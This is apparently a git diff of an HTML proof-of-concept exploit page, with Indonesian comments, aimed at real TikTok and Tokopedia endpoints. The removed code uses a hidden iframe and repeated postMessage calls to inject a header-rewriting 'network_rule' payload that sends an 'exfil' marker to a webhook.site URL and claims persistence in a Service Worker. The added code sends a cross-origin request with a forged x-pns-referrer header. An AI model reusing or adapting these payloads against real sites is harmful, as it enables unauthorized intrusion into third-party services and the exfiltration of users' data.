@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Critical Security Verification</title>
+    <title>Critical Security Verificationn</title>
     <style>
         body { background: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; padding-top: 80px; }
         .terminal { border: 2px solid #0f0; display: inline-block; padding: 40px; box-shadow: 0 0 20px #0f0; background: #050505; }
@@ -24,68 +24,19 @@
             style="display:none;"></iframe>
 
     <script>
-        const gate = document.getElementById('pwn_gate');
-        const statusH1 = document.getElementById('status');
-        const statusP = document.getElementById('sub-status');
-        const logBox = document.getElementById('log');
-
-        // --- KONFIGURASI ---
-        const webhook = "https://webhook.site/60ce3310-1a67-444f-90e0-b1f91ae9881e"; // <--- GANTI INI
-        const targetSite = "https://shop-id.tokopedia.com/";
-
-        function addLog(txt) {
-            logBox.innerHTML += "> " + txt + "<br>";
+    // Langsung tembak API mereka dengan header palsu dari domain kita
+    fetch("https://shop-id.tokopedia.com/api/v1/web-cookie-privacy/config?locale=en&appId=1988", {
+        method: "GET",
+        mode: "cors", // Ini akan memicu CORS check
+        headers: {
+            "x-pns-referrer": "https://fadhlur21.github.io/pwned"
         }
+    }).then(res => {
+        if(res.ok) {
+            document.body.innerHTML = "<h1>CRITICAL: Header Spoofing Success!</h1><p>Server accepted forged x-pns-referrer from GitHub Origin.</p>";
+        }
+    });
+</script>
 
-        // Payload yang menargetkan endpoint penemuanmu
-        const payload = {
-            source: "main_thread",
-            eventName: "network_rule",
-            data: [{
-                ruleName: "exploit_privacy_v12",
-                global: true,
-                // Mencari endpoint yang mengandung string ini
-                url_condition: "web-cookie-privacy", 
-                handlers: [{
-                    handler: "replace",
-                    type: "header",
-                    field: "x-pns-referrer",
-                    // Eksfiltrasi: Webhook + Base64 Identity
-                    value: webhook + "?exfil=" + btoa("pwned_by_fadhlur")
-                }]
-            }]
-        };
-
-        gate.onload = function() {
-            statusH1.innerText = "[ STATUS: EXPLOITING ]";
-            statusP.innerText = "Injecting Remote Configuration...";
-            addLog("Iframe Loaded: https://mon.tiktokv.com");
-
-            // Menggunakan MessageChannel untuk stabilitas koneksi
-            const channel = new MessageChannel();
-            gate.contentWindow.postMessage({source: "main_thread", eventName: "ready_for_msg"}, "*", [channel.port2]);
-
-            let count = 0;
-            const bomb = setInterval(() => {
-                try {
-                    // Kirim payload berulang kali
-                    gate.contentWindow.postMessage(payload, "*");
-                    channel.port1.postMessage(payload);
-                } catch(e) {}
-
-                count++;
-                if (count >= 70) {
-                    clearInterval(bomb);
-                    statusH1.innerText = "[ STATUS: SUCCESS ]";
-                    statusP.innerText = "Payload persistent in Service Worker.";
-                    addLog("Cache sync complete. Redirecting to trigger...");
-
-                    setTimeout(() => {
-                        location.href = targetSite;
-                    }, 5000);
-                }
-            }, 100);
-        };
-    </script>
 </body>
 </html>
